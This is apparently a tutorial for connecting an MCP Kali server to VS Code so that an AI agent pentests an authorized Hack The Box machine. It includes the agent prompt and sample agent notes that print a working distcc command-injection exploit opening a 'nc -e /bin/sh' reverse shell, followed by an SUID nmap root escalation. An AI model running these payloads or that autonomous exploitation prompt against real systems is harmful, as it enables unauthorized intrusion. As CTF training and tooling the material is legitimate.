# MCP + VS Code: Assisted pentest on an HTB box (no local lab) — from install to first flag

**TL;DR:** In this tutorial you will install **Kali + MCP** from scratch, connect **VS Code** as an MCP client, paste a **ready‑to‑use prompt** against an **authorized Hack The Box IP**, **let the agent work** (with minimal guidance if needed), and **collect the results** (reports/logs). No local lab creation required.

> ⚠️ **Legal & ethical:** Operate **only** within **explicitly authorized** scope (e.g., your HTB box via your VPN). Respect platform rules and applicable law.

---

## Before you start — What is MCP?

Rather than re‑explaining MCP, here are **2 reference links** to place at the top:

* **What is MCP?** → [https://www.anthropic.com/news/model-context-protocol](https://www.anthropic.com/news/model-context-protocol)
* **MCP Spec / Developer guide** → [https://modelcontextprotocol.io/specification/2025-06-18](https://modelcontextprotocol.io/specification/2025-06-18)

## Fork lineage & why I reworked it

* **Original announcement/article:** [https://yousofnahya.medium.com/how-mcp-is-revolutionizing-offensive-security-93b2442a5096](https://yousofnahya.medium.com/how-mcp-is-revolutionizing-offensive-security-93b2442a5096)
* **Original GitHub repo:** [https://github.com/Wh0am123/MCP-Kali-Server](https://github.com/Wh0am123/MCP-Kali-Server)

**Why a major fork?** Issues I hit in real scenarios:

* Unstable or missing handling for **persistent network interactions** (SSH, reverse shells), including TTY/pty allocation, reconnection, and timeouts.
* Limited **long I/O stream** handling (blocking prompts/streams) and **process management** (zombies, retries, cancellation).

**What I improved** (highlights):

* **Advanced session management**: robust SSH & reverse‑shell lifecycle (start/stop, status, command execution), PTY support, reconnection and timeouts.

  * Examples: `start_ssh_session`, `execute_ssh_command`, `get_ssh_status`, `start_reverse_shell_listener`, `execute_shell_command`, `get_shell_status`.

* **Comprehensive file operations**: dependable transfers across Kali, SSH and reverse‑shell contexts; large‑file chunking and transfer‑time estimation.

  * Examples: `upload_to_kali`, `download_from_kali`, `ssh_upload_content`, `ssh_download_content`, `reverse_shell_upload_file`, `reverse_shell_download_file`.

> In short: fewer brittle steps and much better long‑running session handling — especially when shells and file transfers enter the picture.

---

## Tutorial goal

1. **Install** the Kali server on Kali linux (from scratch).
2. **Connect** VS Code as the client to the mcp server.
3. **Run the prompt** that helped me grab **flags on several Hack The Box CTFs** (video at the end).
4. **Collect** the results and discuss **how to extend** the MCP and its **risks**.

## Prerequisites

* **Kali Linux** (bare‑metal, VM, or WSL2)
* **VS Code**
* **Git** and **Python 3.10+** (or your preferred runtime)
* Working **HTB access on Kali** (connect the HTB VPN inside Kali; target IP within your scope)

> If Kali runs in **WSL2 or a VM**, ensure the **MCP client OS can reach it**. The **Kali server** listens on `0.0.0.0` by default (only the **port** is configurable). Test connectivity from the client OS to the Kali host IP (e.g., `curl http://<KALI_HOST_IP>:5000/health`). Allow the port through any host firewall if needed. If your **HTB VPN** runs inside Kali/WSL2, DNS and routes live there; verify connectivity from Kali and that the client can still reach your MCP endpoint.

---

## 1) Install, start and manually test the Kali server on Kali linux (from scratch)

```bash
# Update Kali and install basics
sudo apt update && sudo apt -y upgrade
sudo apt -y install git python3-venv python3-pip

# Clone your forked MCP pentest assistant
git clone https://github.com/TriV3/MCP-Kali-Server.git
cd MCP-Kali-Server

# Create and activate a virtualenv
python3 -m venv .venv && source .venv/bin/activate
pip install -U pip wheel
pip install -r requirements.kali.txt
```

**Start the Kali server:**

```bash
cd kali-server
# Start the server (defaults to 0.0.0.0:5000)
python kali_server.py
```

In a second terminal (on the same host or not), verify it responds:

```bash
# Try a simple /health request
curl http://localhost:5000/health
```

You should receive a JSON response like:

```json
{"message":"Kali Linux Tools API Server is running","status":"healthy","version":"0.2.1"}
```

Expected HTTP status: **200 OK**.
The Kali server is now **operational** and **ready to receive commands**.

---

## 2) Configure the MCP client in VS Code (Claude autodiscovery or direct)

Your Kali server is already running from step 1. VS Code can connect in several ways:

> **Official docs:** For detailed options and troubleshooting, see the VS Code documentation on MCP servers: [https://code.visualstudio.com/docs/copilot/chat/mcp-servers](https://code.visualstudio.com/docs/copilot/chat/mcp-servers)

### Install the MCP server (client‑side setup)

On the **machine where VS Code runs** (Windows/macOS/Linux):

```bash
# 1) Clone the repo (or copy the MCP server files)
git clone https://github.com/TriV3/MCP-Kali-Server.git
cd MCP-Kali-Server

# 2) Install dependencies (choose the right file for the MCP side)
pip install -r requirements.mcp.txt

# 3) (Optional) Quick manual run to verify it starts
# VS Code/Claude will usually spawn this for you based on the config block.
python /absolute/path/to/project/mcp-server/mcp_server.py --server http://localhost:5000
# Stop with Ctrl+C
```

You will reference the **Python interpreter** and the **path** to `mcp_server.py` in the `mcpServers` block below.

### A) Automatic discovery (recommended)

Enable VS Code to auto‑discover MCP servers defined in other tools (like Claude Desktop):

1. In VS Code **Settings**, enable **`chat.mcp.discovery.enabled`** ("MCP: Discovery").
2. Define your server in **Claude Desktop** (or any MCP host that VS Code can discover) with a minimal config:

   ```json
   {
     "mcpServers": {
       "pentest-assistant": {
         "command": "/path/to/python",
         "args": ["/absolute/path/to/project/mcp-server/mcp_server.py", "--server", "http://localhost:5000"]
       }
     }
   }
   ```

   If Kali runs in WSL2/VM and VS Code runs outside that guest, use `"http://<KALI_HOST_IP>:5000"`.

> No extra VS Code extension is required for autodiscovery.
>
> More details on autodiscovery and other setup paths: [https://code.visualstudio.com/docs/copilot/chat/mcp-servers](https://code.visualstudio.com/docs/copilot/chat/mcp-servers)

### B) Workspace settings (`.vscode/mcp.json`)

Scope the server to a single project by creating **`.vscode/mcp.json`** in your workspace:

```json
{
  "mcpServers": {
    "pentest-assistant": {
      "command": "/path/to/python",
      "args": ["/path/to/mcp_server.py", "--server", "http://localhost:5000"]
    }
  }
}
```

Use `http://<KALI_HOST_IP>:5000` when the client is external to the Kali host.

### C) User settings (global)

Enable the server across all workspaces via **MCP: Open User Configuration** and add the same `mcpServers` block there. This works well with **Settings Sync**.

---

## 3) The **prompt** that got me HTB flags

**Before you paste the prompt:** open a **new VS Code workspace** (File → New Window → open a clean folder) and make sure the **MCP tools are available in Agent mode**. See the official docs: [https://code.visualstudio.com/docs/copilot/chat/mcp-servers#\_use-mcp-tools-in-agent-mode](https://code.visualstudio.com/docs/copilot/chat/mcp-servers#_use-mcp-tools-in-agent-mode)

Quick checks:

* In the Chat/Tools panel, confirm your **pentest-assistant** MCP server is listed.
* If it isn’t, revisit section 2 (autodiscovery/workspace/user settings) and reload VS Code.
* If Kali runs in WSL2/VM, verify the server URL points to `http://<KALI_HOST_IP>:5000`.

### Prompt anatomy & how it guides the agent

This prompt is structured to give the agent **context**, **capabilities**, **guardrails**, and a **clear deliverable**:

* **Data block (variables):** `Target IP`, `Kali IP`, and **Kali starting folder**. This ensures reverse shells target the right address and the working directory is consistent, so downloads and notes land where you expect.
* **Scope & objective:** “You are helping me solve a HackTheBox challenge…” with a precise goal: enumerate → find **user flag** and **root flag** (HTB convention). Keeps the agent outcome‑driven.
* **Tooling policy (MCP‑first):** “use the functions of the MCP kali\_mcp…” forces the agent to call your **tool functions** instead of ad‑hoc shelling, improving **observability**, **file transfer correctness**, and **session reliability**.
* **Reverse shell routing:** explicitly reminds the agent that any reverse shell must connect back to **Kali IP** (critical in HTB/VM/WSL2 setups).
* **Evidence & artifacts:** create `notes.md` (structured notes), plus `usernames.txt` and `passwords.txt` for credentials. This produces a reusable **attack chain** and separates secrets from narrative.
* **Workspace prep:** “change the Kali directory to the starting folder at startup” so subsequent downloads/exports end up in a predictable location.
* **Persistence:** “Don’t stop until you find the flags.” Encourages iterative enumeration and escalation.
* **Guidelines (quality & etiquette):**

  * Document **all vulnerabilities** (even if not exploited) and keep **timestamps** for each entry.
  * **No brute force**, **avoid Metasploit** — keeps noise low and aligns with HTB norms.
  * Basic **web recon** (list dirs/files) and **tooling** (e.g., Nmap) are called out.
  * When you identify a tech or version, **check for known exploits** and try them (with references).
* **Technical requirements (function bindings):**

  * **SSH** must use the `kali_mcp` SSH API: `ssh_session_start`, `ssh_session_command`, `ssh_session_upload_content`, `ssh_session_download_content`, `ssh_session_stop`.
  * **Reverse shells** must use: `reverse_shell_listener_start`, `reverse_shell_send_payload`, `reverse_shell_command`, `reverse_shell_upload_content`, `reverse_shell_download_content`, `reverse_shell_stop`.
  * **File transfers** must use the `kali_mcp` helpers (for SSH sessions or reverse shells) so artifacts reliably move between **Target ↔ Kali ↔ Host**.
  * **Threading** hint (100 threads) for faster enumeration where applicable.
* **Terminology/architecture:** clarifies what **target**, **kali/kali\_server**, and **Host** mean, and reminds that starting the server in a **shared directory** can simplify Host↔Kali sync.

> **Tip:** Before running it, replace `<TARGET_IP>`, `<KALI_IP>`, and adjust the **starting folder**. Ensure that folder exists and is writable.

> **About** `Kali starting folder` **(shared storage):** In my setup, Windows drive **C:** is mounted inside Kali at **`/c`** (so the path `/c/temp/test-kali-mcp` is accessible from both Kali and Windows/VS Code). This lets the MCP **create and read files** directly in a shared location — for example, generating payloads or downloading artifacts that you can immediately reuse (and even upload to the target) without extra copy steps. In my case, the `Kali starting folder` is the exact folder I have opened in VS Code on Windows, so artifacts created by the MCP appear directly in my active workspace. Without a shared folder, the agent would need to **transfer files to Kali** via one MCP endpoint and **then to the target** via another. If you’re using a **VM** instead of WSL2, you can achieve the same result with a **shared folder** (e.g., VirtualBox Shared Folders, VMware HGFS, Hyper‑V), mounted inside Kali and opened in VS Code on the host.

> **Why this matters for CTF file handling:** Many HTB challenges require downloading files or archives (e.g., **zip**, **tar.gz**, **7z**, **PCAPs**). When the starting folder is your VS Code workspace, the agent can use standard shell tools (`unzip`, `tar`, `7z`, `grep -R`, `strings`, `file`, `exiftool`) directly on those files and immediately reuse outputs (for example, **re‑upload a generated payload to the target**) without extra copy steps. Without a shared workspace, you’d need to shuttle files **Target → Kali → Host** via separate endpoints before inspecting them.

### Full prompt (as used in the video)

```text
Data:
Target IP: <TARGET_IP>
Kali IP: <KALI_IP>
Kali starting folder: /c/temp/test-kali-mcp

You are helping me solve a HackTheBox challenge on the target.
As much as possible, use the functions of the MCP kali_mcp to perform actions, enumeration, exploitation, and file transfers.
The goal is to enumerate the server and locate both the user flag and the root flag (typically text files in home directories).
Attempt to exploit the machine and perform privilege escalation to gain root access.
Keep in mind that reverse shell must be set to trig my Kali IP.
Create a file named `notes.md` and record structured notes of your findings (you do not need to document failed attempts).
Store any discovered usernames and passwords in separate files named `usernames.txt` and `passwords.txt`.
At startup, change the Kali directory to match the Kali starting folder for easy access to downloaded files.
Don't stop untif you find the flags.

Guidelines:
- Document all vulnerabilities found, even if they are not exploited or do not lead to exploitation (e.g., an insecure FTP server).
- Ensure that `notes.md` contains a detailed, step-by-step guide (attack chain) of all commands, findings, vulnerabilities, and actions taken, timestamped (with date and time) for each new entry.
- Don't use bruteforce and avoid using metasploit.
- For web applications:
  - List directories.
  - List files.
- Whenever you identify a tool, framework, programming language, or version, always check for known exploits and attempt to use them by searching the web.
- Use tools like Nmap for network scanning and enumeration.
- Ensure to document all successful steps in `notes.md` with as much detail as possible.
- Include the date and time for each new finding in `notes.md`.
- Regularly sync files between Kali Linux and the Host machine using shared directories or specific commands.

Technical Requirements:
- **SSH Commands**: ALWAYS use the kali_mcp SSH functions (ssh_session_start, ssh_session_command, ssh_session_upload_content, ssh_session_download_content, ssh_session_stop) for any SSH-related operations instead of manual SSH commands.
- **Reverse Shell Commands**: ALWAYS use the kali_mcp reverse shell functions (reverse_shell_listener_start, reverse_shell_send_payload, reverse_shell_command, reverse_shell_upload_content, reverse_shell_download_content, reverse_shell_stop) for establishing and managing reverse shells. Use reverse_shell_send_payload to trigger the listener connection.
- **Enumeration Threading**: Use maximum threads (100 threads) when possible for enumeration tools like Gobuster, Dirb, and other brute-force tools to optimize scanning speed.
- **File Transfer**: Use the appropriate kali_mcp functions for file transfers between target systems and Kali (target_upload_file, target_download_file for reverse shells, or ssh_session functions for SSH sessions).

Terms used in this prompt:
- target: the machine(s) to be exploited
- kali or kali_server: a Kali Linux (which in my case runs under WSL, but could be remote or on a VM) on which the mcp acts to send commands allowing the exploitation of the target
- Host (which in my case is a Windows 11 machine) that uses the mcp kali and other mcps to exploit the target
- Note that during enumeration or other techniques, files downloaded on the target end up on the Kali Linux machine and you need to use the functions of the mcp kali_server to retrieve them on the local machine.
- It is possible to start the kali_server in a shared directory so that Host and Kali have access to the same data.
```

---

## 4) Collect the results

The artifacts you get **depend on the prompt you give**. In the video run, I asked the agent to create **three files** in the **Kali starting folder** (the shared workspace opened in VS Code):

* `notes.md` — the structured engagement log (timeline, findings, exploit steps, flags).
* `usernames.txt` — any discovered usernames.
* `passwords.txt` — any discovered or cracked passwords/secrets.

You’ll find them in the **Kali starting folder** you set (e.g., `/c/temp/test-kali-mcp`).

### Example: `notes.md` produced by the run in the video

```markdown
# HackTheBox Challenge Notes

**Target IP:** <TARGET_IP>  
**Kali IP:** <KALI_IP>  
**Start Time:** August 7, 2025

## Timeline and Findings

### 2025-08-07 - Initial Setup
- Verified Kali MCP server health: Healthy (v0.2.1)
- Confirmed Kali IP configuration: <KALI_IP> on tun0 interface
- Working directory set to: /c/temp/test-kali-mcp
- Created documentation files (notes.md, usernames.txt, passwords.txt)

### 2025-08-07 22:06 - Nmap Port Scan Results
**Target:** <TARGET_IP> (lame.hackthebox.gr)

**Open Ports:**
- **21/tcp** - FTP (vsftpd 2.3.4) - Anonymous login allowed
- **22/tcp** - SSH (OpenSSH 4.7p1 Debian 8ubuntu1)
- **139/tcp** - NetBIOS-SSN (Samba smbd 3.X - 4.X)
- **445/tcp** - NetBIOS-SSN (Samba smbd 3.0.20-Debian)
- **3632/tcp** - distccd v1 ((GNU) 4.2.4)

**Key Findings:**
- OS: Unix (Samba 3.0.20-Debian)
- Computer name: lame
- Domain: hackthebox.gr
- Anonymous FTP access enabled
- Old SSH version (4.7p1)
- Old Samba version (3.0.20-Debian)
- distccd service running on port 3632

### 2025-08-07 22:11 - SMB Enumeration (enum4linux)
**Notable Users Found:**
- root
- user  
- msfadmin
- administrator

**SMB Shares:**
- tmp (accessible with anonymous login)
- print$ (denied)
- opt (denied)
- IPC$ 
- ADMIN$ (denied)

### 2025-08-07 22:12 - distcc Vulnerability Identified
- CVE-2004-2687: distcc Daemon Command Execution
- Service vulnerable to arbitrary command execution
- Confirmed with test command: `id` returned `uid=1(daemon) gid=1(daemon) groups=1(daemon)`

### 2025-08-07 22:13 - SUCCESSFUL EXPLOITATION!
**Exploit Method:** distcc CVE-2004-2687 command injection
**Command Used:** `nmap -p 3632 <TARGET_IP> --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='nc -e /bin/sh <KALI_IP> 4444'"`
**Result:** Reverse shell established as `daemon` user
**System:** Linux lame 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux

### 2025-08-07 22:14 - FLAG DISCOVERY
**User Flag Location:** /home/<REDACTED>/user.txt
**User Flag:** <REDACTED>

### 2025-08-07 22:15 - PRIVILEGE ESCALATION
**Method:** SUID nmap binary exploitation (CVE-2019-7287 family)
**Discovery:** `find / -perm -u=s -type f 2>/dev/null` revealed `/usr/bin/nmap` with SUID bit
**Nmap Version:** 4.53 (vulnerable to interactive mode privilege escalation)
**Exploitation:** 
1. Executed `nmap --interactive` 
2. Used `!sh` to spawn root shell
3. Verified escalation: `uid=1(daemon) gid=1(daemon) euid=0(root) groups=1(daemon)`

### 2025-08-07 22:16 - ROOT FLAG ACQUIRED
**Root Flag Location:** /root/root.txt  
**Root Flag:** <REDACTED>

## MISSION COMPLETE ✓
**Both flags successfully obtained:**
- User Flag: <REDACTED>
- Root Flag: <REDACTED>

**Attack Chain Summary:**
1. Port scan revealed distccd service on port 3632
2. Exploited CVE-2004-2687 in distccd for initial shell access as daemon
3. Discovered SUID nmap binary for privilege escalation
4. Used nmap interactive mode to gain root privileges
5. Retrieved both user and root flags
```

> The `usernames.txt` and `passwords.txt` files list any credentials the agent extracted or derived. Use them carefully and keep them out of version control.

---

## 5) Demo video (HTB flags)

Watch the **demo video** showing this prompt in action and retrieving flags:

[![MCP Kali server in action](http://img.youtube.com/vi/Wej1z-vfxz0/0.jpg)](http://www.youtube.com/watch?v=Wej1z-vfxz0 "MCP Kali server in action")

> The recording is **entirely in real time** — no cuts, time‑lapses, or speed‑ups. What you see is the actual end‑to‑end runtime on my setup.

---

## 6) Extend the tool… and understand the risks

**Possible extensions**

* **RAG MCP (team knowledge base for pentesting):** add a Retrieval‑Augmented Generation server backed by a pentest‑specific corpus (cheat sheets, prior reports, playbooks, internal notes). Let each Red Team maintain **org‑specific** entries (tech stack quirks, hosts naming, change windows). Use it in prompts ("consult the RAG KB for technique X and cite sources").

* **Reporting/Notes MCP (structured evidence capture & formatting):** add a companion MCP that structures findings into standard pentest report sections and renders them via tools like **Obsidian**, **SysReptor**, or **PwnDoc** *(examples only; use any reporting/knowledge tool that fits your workflow)*. Suggested section set (derived from HTB’s template: [https://www.hackthebox.com/blog/penetration-testing-reports-template-and-guide](https://www.hackthebox.com/blog/penetration-testing-reports-template-and-guide)): **Admin info, Scope, Targets, Attack paths, Credentials found or cracked, Findings (vulns, CVEs, PoCs, impact, risk), Vulnerability scans & research, Service enumeration, Logs, Activity (timeline), Artifacts (screenshots, samples), Cleanup (document teardown steps: remove test accounts/backdoors, drop temporary creds/artifacts, restore states per ROE)**. Typical actions: *create engagement*, *append finding*, *link artifacts*, *export HTML/PDF*.

* **Pivoting MCP (intra‑network access & tunneling):** add first‑class support for pivot operations to reach internal subnets once an initial foothold is obtained.

  * Launch and manage pivots (e.g., **chisel**, **ligolo‑ng**, SSH dynamic port forwarding `ssh -D`, SOCKS5 proxies).
  * Create/inspect tunnels (TCP/UDP), add/remove routes, and validate reachability (ICMP/TCP checks) from the pivoted context.
  * Expose simple actions: *start pivot agent/listener*, *add port‑forward*, *list tunnels*, *probe service via pivot*, *teardown cleanly*.
  * Keep strict scope controls and logs; only operate on networks authorized by the ROE.

**Risks & precautions (Kali server focus)**

* **Full OS access (even non‑root):** the MCP server runs commands on the Kali host with the privileges of the launching user. Even without root it can delete/overwrite files, modify user configs, change network state, or drop binaries. Run it as a **dedicated least‑privileged user** in a restricted workspace; never as root for routine work.
* **Network exposure of the API (Kali server):** the Kali server binds to `0.0.0.0` by default and currently only the port is configurable. This means it is reachable on all interfaces of the Kali host. Do **not** expose it to the public internet.
* **Dangerous command classes:** package installs, file deletions/moves, network reconfiguration, credential collection. Require **human approval** and consider an **allow/deny list** or review step for high‑impact commands.
* **Isolation:** prefer a **separate VM/WSL2 distro** or a **container** (e.g., Podman) with only the needed directories mounted. Take VM snapshots before engagements.
* **Secrets & artifacts:** store credentials and artifacts in a dedicated directory with restricted permissions; encrypt at rest if needed; **scrub after the engagement**.
* **Logging & privacy:** structured logs may capture sensitive data. Redact, rotate, and avoid sending logs to third‑party services without explicit approval.
* **Scope enforcement on the server:** validate requested targets/IPs are within the authorized scope before executing network actions.

---

## Human‑in‑the‑loop, by design (scope & limitations)

This project is **not currently** about fully automating penetration tests end‑to‑end. It accelerates **recon, triage, repetitive tasks, and reporting scaffolding**, but it still requires a skilled operator.

* Expect to **step in** for reasoning, chaining findings, and exploitation choices.
* Out of the box today, it will **struggle to fully solve** complex labs or advanced real‑world environments **without human guidance** — e.g., **medium/hard HTB boxes**, custom app logic, chained vulns, kernel/priv‑esc nuances, AV/EDR evasion, and lateral movement.
* With further evolution (specialized models, org‑specific RAG, richer tool plugins, and orchestration), **higher levels of autonomy are possible** — some companies already deliver such capabilities commercially. This project **intentionally prioritizes** transparency, explicit approvals, and operator control over blind end‑to‑end automation.
* Treat outputs as **suggestions**, **validate manually**, and keep approvals for intrusive steps.
* Use it as a **copilot**: you own scope control, hypotheses, risk decisions, and final actions.
